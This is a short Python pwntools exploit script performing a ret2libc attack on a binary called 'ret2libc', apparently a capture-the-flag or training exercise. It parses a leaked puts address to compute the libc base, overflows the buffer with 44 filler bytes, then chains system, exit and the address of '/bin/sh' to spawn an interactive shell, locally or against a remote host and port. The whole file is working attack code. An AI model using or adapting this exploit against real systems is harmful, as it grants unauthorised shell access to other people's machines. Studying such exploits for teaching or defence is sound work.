import struct
import sys
from pwn import *

def pack(addr):
    return struct.pack('<I', addr)

# remote
puts_offset = 0x0005fca0        # find by 'readelf -s xxx.libc.sox | grep xxx
exit_offset = 0x0002e9d0
system_offset = 0x0003ada0
arg_offset = 0x0015ba0b         # find by strings -a -t x <path to libc.so.6> | grep '/bin/sh'
# local
# puts_offset = 0x00069210
# system_offset = 0x0003eb40

if len(sys.argv) >= 3:
    io = remote(sys.argv[1], sys.argv[2])
else:
    io = process('./ret2libc')

io.recvline()
line = io.recvline()

# puts_addr = 0xf7e33210      # TEST
puts_addr = int(line[line.rfind(' ') + 1:], 16)
libc_base = puts_addr - puts_offset
system_addr = libc_base + system_offset
exit_addr = libc_base + exit_offset
arg_addr = libc_base + arg_offset

buff = '\x90' * 44 + pack(system_addr) + pack(exit_addr) + pack(arg_addr)

# print(buff)     # TEST

io.sendline(buff)
io.interactive()
